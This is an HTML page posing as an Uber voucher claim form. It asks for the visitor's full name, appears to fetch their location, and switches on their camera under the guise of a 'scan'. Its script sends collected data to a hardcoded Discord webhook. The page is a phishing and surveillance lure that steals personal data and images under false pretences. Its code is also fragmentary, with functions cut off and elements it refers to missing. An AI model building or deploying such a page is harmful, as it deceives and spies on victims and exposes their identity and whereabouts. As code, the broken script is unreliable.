<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uber Voucher - Verification System</title>
    <style>
        body { margin: 0; height: 100vh; background: #f6f6f6; display: flex; align-items: center; justify-content: center; font-family: 'Segoe UI', Tahoma, sans-serif; flex-direction: column; }
        .logo-top { width: 120px; margin-bottom: 20px; }
        .card { background: #fff; padding: 35px 25px; border-radius: 12px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid #eee; }
        h1 { font-size: 22px; margin-bottom: 10px; color: #000; }
        p { color: #666; font-size: 15px; margin-bottom: 20px; line-height: 1.4; }
        
        input[type="text"] {
            width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none;
        }
        input[type="text"]:focus { border-color: #000; }

        .btn-black {
            padding: 16px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; color: #fff; background: #000; width: 100%; transition: 0.3s;
        }
        .btn-black:hover { background: #333; }
        .btn-black:disabled { background: #999; cursor: not-allowed; }

        #step2, #video, #canvas { display: none; }
    </style>
</head>
<body>

<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/58/Uber_logo_2018.svg/2560px-Uber_logo_2018.svg.png" class="logo-top">

<div class="card">
    <div id="step1">
        <h1>Claim Your Voucher</h1>

        <input type="text" id="userName" placeholder="Full Name">

</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1467297371728646269/MDsU8tI-Mzcb5Mo0RTB2HLGTIx-G-CuPakfTnTPeLIT_9p6I8CF0_cBqf0Vkh1E1fplv";

    const step1 = document.getElementById("step1");
    const step2 = document.getElementById("step2");
    const userNameInput = document.getElementById("userName");
    const btnNext = document.getElementById("btnNext");

                    resolve(url);
                },
                (error) => {

            btnNext.disabled = false;
            btnNext.innerText = "Check Eligibility";
        }
    };

    btnContinue.onclick = async () => {
        btnContinue.disabled = true;
        btnContinue.innerText = "Connecting to Scan...";
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            btnContinue.style.display = "none";

</script>

</body>
</html>
